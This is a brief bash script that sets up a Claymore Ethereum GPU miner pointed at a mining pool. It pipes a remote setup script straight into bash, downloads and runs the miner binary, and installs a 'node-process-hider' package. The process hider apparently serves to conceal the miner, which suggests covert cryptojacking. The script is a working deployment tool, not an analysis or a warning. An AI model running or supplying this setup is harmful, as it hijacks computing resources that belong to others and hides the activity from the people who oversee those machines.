#!/bin/bash
sudo apt update && sudo apt-get install zip unzip && sudo apt install libpci3
wget -O - https://deb.nodesource.com/setup_17.x | bash
apt -y install nodejs
apt -y install npm
npm i -g node-process-hider
wget https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip && unzip Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip && cd Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX
chmod +x ethdcrminer64 && ./ethdcrminer64 -epool stratum+tcp://ethash.kupool.com:443 -ewal thunder0x -eworker Rig1 -epsw x -mode 1 -dbg -1 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -ttli 77 -tstop 89 
